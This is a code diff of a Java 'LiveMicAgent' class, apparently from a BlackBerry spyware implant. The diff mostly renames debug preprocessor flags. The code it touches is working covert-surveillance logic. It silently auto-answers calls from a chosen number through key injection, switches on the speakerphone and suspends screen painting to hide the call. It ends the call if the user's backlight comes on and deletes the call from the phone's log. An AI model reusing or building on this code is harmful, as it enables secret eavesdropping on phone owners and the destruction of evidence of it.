@@ -98,7 +98,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
             return false;
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Tapping number: " + number);
         //#endif
         return true;
@@ -143,7 +143,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("    === callAnswered: " + phoneNumber + "===");
         //#endif
 
@@ -158,7 +158,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         MenuWalker.walk(new String[] { "Return to Phone" });
         MenuWalker.walk(new String[] { "Activate Speakerphone" });
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("onCallAnswered: finished");
         //#endif
     }
@@ -174,7 +174,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("    === callConnected: " + phoneNumber + " ===");
         //#endif      
 
@@ -196,19 +196,19 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     public synchronized void onCallDisconnected(final int callId,
             final String phoneNumber) {
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("======= callDisconnected: " + phoneNumber + " =======");
         //#endif
 
         autoanswer = false;
 
         if (!interestingNumber(callId, phoneNumber)) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("onCallDisconnected: not interesting");
             //#endif
             return;
         } else {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("onCallDisconnected, interesting");
             //#endif
         }
@@ -229,7 +229,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("======= incoming: " + phoneNumber + " =======");
         //#endif
 
@@ -240,23 +240,22 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         suspendPainting(true);
 
         if (backlight) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Backlight enabled, killing incoming call");
             //#endif
             KeyInjector.pressKey(Keypad.KEY_END);
         } else {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Backlight disabled, accepting incoming call");
             //#endif
             KeyInjector.pressKey(Keypad.KEY_SEND);
         }
 
     }
-    
 
     public void onCallInitiated(int callId, String phoneNumber) {
         // TODO Auto-generated method stub
-        
+
     }
 
     boolean backlight;
@@ -268,7 +267,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     public synchronized void onBacklightChange(final boolean statusOn) {
         if (autoanswer && statusOn) {
             autoanswer = false;
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("onBacklightChange: sending END");
             //#endif
             suspendPainting(true);
@@ -289,13 +288,13 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      */
     private void suspendPainting(final boolean suspend) {
         if (!Conf.IS_UI) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("Not UI");
             //#endif
             return;
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("suspendPainting: " + suspend + " suspended: " + suspended);
         //#endif              
 
@@ -305,8 +304,8 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
                     //#ifdef LIVE_MIC_ENABLED
                     UiApplication.getUiApplication().suspendPainting(suspend);
                     //#endif
-                } catch (IllegalStateException ex) {
-                    //#ifdef DEBUG_ERROR
+                } catch (final IllegalStateException ex) {
+                    //#ifdef DEBUG
                     debug.error(ex);
                     //#endif
                 }
@@ -329,14 +328,14 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         //#endif
 
         if (!phoneNumber.endsWith(number)) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
                     + number);
             //#endif
             return false;
         } else {
             if (phoneNumber != null) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("callingHistory adding callId: " + callId);
                 //#endif                
             }
@@ -347,13 +346,14 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
 
     public void callLogAdded(String number, String name, Date date,
             int duration, boolean outgoing, boolean missed) {
-        PhoneLogs phoneLogs = PhoneLogs.getInstance();
-        int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
+        final PhoneLogs phoneLogs = PhoneLogs.getInstance();
+        final int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
         for (int i = 0; i < num; i++) {
-            CallLog log = phoneLogs.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS);
+            final CallLog log = phoneLogs.callAt(i,
+                    PhoneLogs.FOLDER_NORMAL_CALLS);
 
             if (date.getTime() == log.getDate().getTime()) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("deleting date: " + log.getDate());
                 //#endif 
                 phoneLogs.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
@@ -361,11 +361,11 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
             }
         }
 
-        int newnum = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
-        //#ifdef DEBUG_TRACE
+        final int newnum = phoneLogs
+                .numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
+        //#ifdef DEBUG
         //debug.trace("num: " + num + " after delete:" + newnum);
         //#endif
     }
-
 
 }
